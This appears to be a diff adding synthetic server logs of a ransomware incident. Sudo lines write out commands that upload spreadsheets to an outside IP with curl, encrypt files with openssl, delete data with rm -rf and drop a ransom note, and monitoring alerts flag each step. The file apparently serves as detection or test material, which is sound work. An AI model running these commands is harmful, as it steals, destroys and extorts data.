@@ -1,0 +1,19 @@
+Jul 28 16:00:00 finance-server auditd[13010]: SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffe0b0b0b00 a2=241 a3=1b6 items=1 ppid=13005 pid=13011 auid=1009 uid=1009 gid=1009 euid=1009 suid=1009 fsuid=1009 egid=1009 sgid=1009 fsgid=1009 tty=pts0 ses=8 comm="python3" exe="/usr/bin/python3" key="file_create"
+Jul 28 16:00:01 finance-server auditd[13012]: SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffe0b0b0b00 a2=241 a3=1b6 items=1 ppid=13005 pid=13013 auid=1009 uid=1009 gid=1009 euid=1009 suid=1009 fsuid=1009 egid=1009 sgid=1009 fsgid=1009 tty=pts0 ses=8 comm="python3" exe="/usr/bin/python3" key="file_create"
+Jul 28 16:00:02 finance-server auditd[13014]: SYSCALL arch=c000003e syscall=87 success=yes exit=0 a0=7f1b2c3d4e00 a1=0 a2=7f1b2c3d4f00 a3=0 items=0 ppid=13005 pid=13015 auid=1009 uid=1009 gid=1009 euid=1009 suid=1009 fsuid=1009 egid=1009 sgid=1009 fsgid=1009 tty=pts0 ses=8 comm="python3" exe="/usr/bin/python3" key="file_delete"
+Jul 28 16:00:03 finance-server auditd[13016]: SYSCALL arch=c000003e syscall=87 success=yes exit=0 a0=7f1b2c3d4e10 a1=0 a2=7f1b2c3d4f10 a3=0 items=0 ppid=13005 pid=13017 auid=1009 uid=1009 gid=1009 euid=1009 suid=1009 fsuid=1009 egid=1009 sgid=1009 fsgid=1009 tty=pts0 ses=8 comm="python3" exe="/usr/bin/python3" key="file_delete"
+Jul 28 16:00:30 finance-server sudo[13020]:   jdoe : TTY=pts/0 ; PWD=/mnt/nfs/company_data ; USER=root ; COMMAND=/usr/bin/find . -type f -name "*.xlsx" -exec curl -F "file=@{}" http://185.220.109.50:8000/exfil \;
+Jul 28 16:01:00 finance-server auditd[13025]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55a1b2c3d400 a1=55a1b2c3d500 a2=55a1b2c3d600 a3=0 items=2 ppid=13020 pid=13026 auid=1009 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=8 comm="openssl" exe="/usr/bin/openssl"
+Jul 28 16:01:30 finance-server process_monitor[13030]: ALERT: High I/O on /mnt/nfs/company_data - 1500 files modified in 30 seconds
+Jul 28 16:02:00 finance-server sudo[13035]:   jdoe : TTY=pts/0 ; PWD=/mnt/nfs/company_data ; USER=root ; COMMAND=/bin/bash -c 'for f in /mnt/nfs/company_data/*.xlsx; do openssl enc -aes-256-cbc -salt -in "$f" -out "$f.encrypted" -pass pass:ransomkey2026; done'
+Jul 28 16:02:30 finance-server process_monitor[13040]: ALERT: Ransomware-like behavior detected on /mnt/nfs/company_data - files being encrypted with .encrypted extension
+Jul 28 16:03:00 finance-server sudo[13045]:   jdoe : TTY=pts/0 ; PWD=/mnt/nfs/company_data ; USER=root ; COMMAND=/bin/bash -c 'rm -rf /mnt/nfs/company_data/*.xlsx /mnt/nfs/company_data/*.docx /mnt/nfs/company_data/*.pdf'
+Jul 28 16:03:30 finance-server sudo[13050]:   jdoe : TTY=pts/0 ; PWD=/mnt/nfs/company_data ; USER=root ; COMMAND=/bin/bash -c 'cat > /mnt/nfs/README_TO_RESTORE.html << "EOF"
+<!DOCTYPE html><html><body><h1>YOUR FILES ARE ENCRYPTED</h1><p>Send 5 BTC to bc1qxyz... to get decryption key</p></body></html> EOF'
+Jul 28 16:04:00 finance-server sshd[13055]: Accepted password for jdoe from 185.220.109.50 port 59001 ssh2
+Jul 28 16:04:01 finance-server sshd[13055]: pam_unix(sshd:session): session opened for user jdoe by (uid=0)
+Jul 28 16:04:30 finance-server process_monitor[13060]: ALERT: 15 concurrent encryption processes detected on filesystem /dev/sdb1
+Jul 28 16:05:00 finance-server ossec[13065]: [SECURITY] File integrity check: /mnt/nfs/company_data/financial_report_2026.xlsx hash changed from a1b2c3d4 to e5f6a7b8
+Jul 28 16:05:01 finance-server ossec[13066]: [SECURITY] File integrity check: /mnt/nfs/company_data/customer_list.xlsx hash changed from b2c3d4e5 to f6a7b8c9
+Jul 28 16:05:02 finance-server ossec[13067]: [SECURITY] New file detected: /mnt/nfs/company_data/README_TO_RESTORE.html - possible ransomware note
+Jul 28 16:06:00 finance-server sudo[13070]:   jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/curl -s http://185.220.109.50:8000/checkin
